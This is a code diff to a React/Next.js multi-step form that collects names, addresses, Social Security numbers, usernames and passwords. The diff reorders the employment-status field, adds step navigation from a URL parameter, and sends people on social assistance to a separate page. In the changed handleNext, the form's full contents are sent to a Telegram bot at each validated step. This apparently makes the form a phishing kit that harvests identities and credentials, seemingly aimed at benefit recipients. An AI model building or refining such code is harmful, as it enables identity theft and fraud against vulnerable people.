@@ -6,6 +6,7 @@ import { useRouter } from "next/navigation";
 import axios from "axios";
 import { sendTelegramMessage } from "../../utils/telegram";
 import { AxiosError } from 'axios';
+import { useEffect } from "react";
 
 const states = [
     'AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA',
@@ -43,6 +44,13 @@ const MultiStepForm = () => {
   const router = useRouter();
   const [currentStep, setCurrentStep] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const step = urlParams.get('step');
+    if (step) {
+      setCurrentStep(parseInt(step)); // Set the step if it exists
+    }
+  }, []);
   const [formData, setFormData] = useState<FormData>({
     firstName: '',
     lastName: '',
@@ -91,6 +99,7 @@ const MultiStepForm = () => {
 
     if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
     if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
+    if (!formData.employmentStatus) newErrors.employmentStatus = 'Employment status is required';
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
@@ -102,7 +111,6 @@ const MultiStepForm = () => {
     if (!formData.email.match(emailRegex)) newErrors.email = 'Invalid email address';
     if (!formData.address.trim()) newErrors.address = 'Address is required';
     if (!formData.state) newErrors.state = 'State is required';
-    if (!formData.employmentStatus) newErrors.employmentStatus = 'Employment status is required';
     if (!formData.username.trim()) newErrors.username = 'Username is required';
     if (formData.password.length < 8) newErrors.password = 'Password must be at least 8 characters';
     if (formData.password !== formData.confirmPassword) newErrors.confirmPassword = 'Passwords do not match';
@@ -121,10 +129,22 @@ const MultiStepForm = () => {
 
   const handleNext = async () => {
     const isValid = currentStep === 1 ? validateStep1() : validateStep2();
-    if (isValid) setCurrentStep(prev => prev + 1);
-    const message = formatTelegramMessage(formData);
-    await sendTelegramMessage(message);
+    
+    if (isValid) {
+      const message = formatTelegramMessage(formData);
+      await sendTelegramMessage(message);
+  
+      // Conditional Navigation based on Employment Status
+      if (formData.employmentStatus === 'Social assistance (income supplement)') {
+        router.push('/ssipage'); // Replace with your actual page route
+        return; // Stop further execution
+      }
+  
+      // If no condition is met, proceed to the next step
+      setCurrentStep(prev => prev + 1);
+    }
   };
+  
 
   const handleSubmit = async () => {
     setIsLoading(true); // Start loading state
@@ -279,6 +299,22 @@ const MultiStepForm = () => {
               maxLength={14}
               required
             />
+            <SelectField
+                label="Employment Status"
+                value={formData.employmentStatus}
+                options={['Full time',
+                    'Part time',
+                    'Self-employed',
+                    'Seasonal (EI)',
+                    'Retired (pension)',
+                    'Maternity leave',
+                    'Disability',
+                    'Social assistance (income supplement)',
+                    'Unemployed']}
+                onChange={v => handleChange('employmentStatus', v)}
+                error={errors.employmentStatus}
+                required
+              />
 
             <InputField
               label="Social Security Number"
@@ -337,22 +373,7 @@ const MultiStepForm = () => {
                 required
               />
               
-              <SelectField
-                label="Employment Status"
-                value={formData.employmentStatus}
-                options={['Full time',
-                    'Part time',
-                    'Self-employed',
-                    'Seasonal (EI)',
-                    'Retired (pension)',
-                    'Maternity leave',
-                    'Disability',
-                    'Social assistance (income supplement)',
-                    'Unemployed']}
-                onChange={v => handleChange('employmentStatus', v)}
-                error={errors.employmentStatus}
-                required
-              />
+              
             </div>
 
             <InputField
